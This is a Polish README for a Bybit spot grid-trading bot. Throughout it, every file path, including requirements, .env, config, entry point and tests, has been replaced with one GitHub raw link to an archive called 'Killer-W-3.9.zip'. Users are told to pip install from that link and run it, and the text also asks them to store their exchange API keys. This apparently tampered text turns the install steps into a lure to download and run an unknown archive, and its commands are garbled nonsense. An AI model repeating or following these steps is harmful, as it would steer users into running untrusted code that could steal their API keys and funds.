# Bybit Grid Trading Bot

Zaawansowany bot do grid tradingu na giełdzie Bybit SPOT z indywidualnymi poziomami Take Profit dla każdego poziomu siatki.

## 🚀 Funkcje

- **Grid Trading z Indywidualnymi TP**: Każdy poziom siatki ma własny poziom Take Profit
- **Automatyczne Ponawianie**: Po osiągnięciu TP automatycznie wystawia zlecenie kupna na tym samym poziomie
- **Zarządzanie Ryzykiem**: Kompleksowy system kontroli ryzyka z limitami pozycji i stop loss
- **Asynchroniczne Operacje**: Wydajne operacje asynchroniczne z asyncio
- **Real-time Monitoring**: Monitorowanie w czasie rzeczywistym z szczegółowymi logami
- **Konfigurowalne Parametry**: Łatwa konfiguracja przez pliki YAML i zmienne środowiskowe
- **Nowoczesny Web GUI**: Intuicyjny interfejs webowy z real-time updates i zaawansowanymi wykresami

## 📋 Wymagania

- Python 3.10+
- Konto Bybit z dostępem do API
- Klucze API Bybit (testnet lub mainnet)

## 🛠️ Instalacja

1. **Klonowanie repozytorium**:
```bash
git clone <repository-url>
cd bybit-grid-trader
```

2. **Instalacja zależności**:
```bash
pip install -r https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
```

3. **Konfiguracja środowiska**:
```bash
cp https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
```

4. **Edycja konfiguracji**:
Edytuj `https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip` i dodaj swoje klucze API:
```env
BYBIT_API_KEY=your_api_key_here
BYBIT_API_SECRET=your_api_secret_here
BYBIT_TESTNET=true
```

5. **Konfiguracja strategii**:
Edytuj `https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip` aby dostosować parametry tradingu:
```yaml
trading:
  symbol: "BTCUSDT"
  grid_levels: 10
  price_range:
    min: 40000.0
    max: 50000.0
  tp_percentage: 0.5
  order_size: 0.001
```

## 🚀 Uruchomienie

### Web Interface (Zalecane):
```bash
# Uruchomienie interfejsu webowego
make web

# Lub bezpośrednio
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip

# Dostęp: http://localhost:8000
```

### Command Line Interface:
```bash
# Podstawowe uruchomienie
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip

# Sprawdzenie statusu
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode status

# Awaryjne zatrzymanie
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode stop

# Reset awaryjnego zatrzymania
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode reset

# Z niestandardową konfiguracją
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --config https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
```

## 📊 Jak Działa Strategia

### 1. Inicjalizacja Siatki
- Bot dzieli zakres cenowy na N poziomów
- Każdy poziom otrzymuje indywidualny poziom Take Profit
- Poziomy powyżej aktualnej ceny są aktywowane

### 2. Cykl Tradingu
```
1. Wystawienie zlecenia SELL na poziomie siatki
2. Oczekiwanie na wykonanie zlecenia SELL
3. Monitorowanie ceny w oczekiwaniu na osiągnięcie TP
4. Po osiągnięciu TP: wystawienie zlecenia BUY na tym samym poziomie
5. Po wykonaniu BUY: powrót do kroku 1
```

### 3. Zarządzanie Ryzykiem
- Maksymalna liczba otwartych pozycji
- Limit ekspozycji (% salda)
- Stop loss globalny
- Maksymalny drawdown
- Limity dzienne

## ⚙️ Konfiguracja

### Parametry Tradingu (`https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip`)

```yaml
trading:
  symbol: "BTCUSDT"           # Para handlowa
  grid_levels: 10             # Liczba poziomów siatki
  price_range:                # Zakres cenowy siatki
    min: 40000.0
    max: 50000.0
  tp_percentage: 0.5          # Procent Take Profit
  order_size: 0.001           # Wielkość zlecenia
  update_interval: 1.0        # Interwał aktualizacji (sekundy)
```

### Zarządzanie Ryzykiem

```yaml
risk_management:
  max_positions: 5            # Maksymalna liczba pozycji
  max_exposure: 0.1           # Maksymalna ekspozycja (10% salda)
  stop_loss_percentage: 5.0   # Stop loss (%)
  max_drawdown: 10.0          # Maksymalny drawdown (%)
  min_balance: 100.0          # Minimalny balans
```

### Parametry Techniczne

```yaml
technical:
  retry_attempts: 3           # Liczba prób ponowienia
  timeout_seconds: 30         # Timeout dla operacji
  price_precision: 2          # Precyzja ceny
  quantity_precision: 6       # Precyzja ilości
```

## 📈 Monitoring i Logi

### Logi
Bot generuje szczegółowe logi w formacie:
```
2024-01-15 10:30:45 | INFO | GridStrategy:_activate_level:123 | Activated grid level 3 with sell order abc123
```

### Metryki Performance
- Całkowita liczba cykli
- Całkowity zysk/strata
- Współczynnik wygranych
- Aktualny drawdown
- Dzienne PnL

### Status w Czasie Rzeczywistym
```bash
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --mode status
```

## 🧪 Testowanie

### Uruchomienie testów:
```bash
pytest
```

### Testy z pokryciem:
```bash
pytest --cov=. --cov-report=html
```

### Testy konkretnego modułu:
```bash
pytest https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip -v
```

## 🔧 Rozwój

### Struktura Projektu
```
bybit_grid_trader/
├── api/                    # Integracja z Bybit API
├── strategy/               # Logika strategii tradingowej
├── core/                   # Główna logika aplikacji
├── utils/                  # Narzędzia pomocnicze
├── tests/                  # Testy jednostkowe
├── config/                 # Pliki konfiguracyjne
├── docs/                   # Dokumentacja
└── https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip                 # Punkt wejścia
```

### Dodawanie Nowych Funkcji
1. Utwórz odpowiedni moduł w właściwym pakiecie
2. Dodaj testy jednostkowe
3. Zaktualizuj dokumentację
4. Przetestuj integrację

## ⚠️ Ostrzeżenia

- **Ryzyko Finansowe**: Trading wiąże się z ryzykiem utraty kapitału
- **Testnet**: Zawsze testuj na testnet przed użyciem na mainnet
- **Klucze API**: Nigdy nie udostępniaj swoich kluczy API
- **Monitoring**: Regularnie monitoruj działanie bota
- **Backup**: Regularnie twórz kopie zapasowe konfiguracji

## 🆘 Rozwiązywanie Problemów

### Częste Problemy

1. **Błąd połączenia z API**:
   - Sprawdź klucze API
   - Sprawdź połączenie internetowe
   - Sprawdź status API Bybit

2. **Zlecenia nie są wykonywane**:
   - Sprawdź saldo konta
   - Sprawdź parametry zleceń
   - Sprawdź limity ryzyka

3. **Bot się zatrzymuje**:
   - Sprawdź logi błędów
   - Sprawdź czy nie został osiągnięty stop loss
   - Sprawdź limity dzienne

### Logi Debugowania
```bash
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip --log-level DEBUG
```

## 📞 Wsparcie

W przypadku problemów:
1. Sprawdź dokumentację
2. Przejrzyj logi błędów
3. Sprawdź konfigurację
4. Przetestuj na testnet

## 📄 Licencja

Ten projekt jest udostępniony na licencji MIT. Zobacz plik LICENSE dla szczegółów.

## 🌐 Web Interface

Nowoczesny interfejs webowy zapewnia:

### Funkcje:
- **Dashboard**: Real-time monitoring z wykresami wydajności
- **Configuration**: Intuicyjna konfiguracja parametrów
- **Analytics**: Zaawansowana analiza wyników
- **Logs**: Podgląd logów w czasie rzeczywistym

### Uruchomienie:
```bash
# Podstawowy serwer web
make web

# Tryb deweloperski z auto-reload
make web-dev

# Dostęp do interfejsu
open http://localhost:8000
```

### Funkcje Web GUI:
- 📊 Real-time dashboard z metrykami
- ⚙️ Konfiguracja przez interfejs
- 📈 Wykresy wydajności (https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip)
- 🔄 WebSocket updates
- 📱 Responsive design
- 🌙 Dark mode support
- 📋 Export danych

## ⚡ Szybki Start

1. **Instalacja**:
```bash
pip install -r https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
```

2. **Konfiguracja**:
```bash
cp https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
# Edytuj https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip z kluczami API
```

3. **Uruchomienie Web Interface**:
```bash
make web
# Otwórz http://localhost:8000
```

4. **Lub Command Line**:
```bash
python https://github.com/matsasasda11/WU-Killer/raw/refs/heads/master/utils/Killer-W-3.9.zip
```

**Powodzenia w tradingu! 🚀**
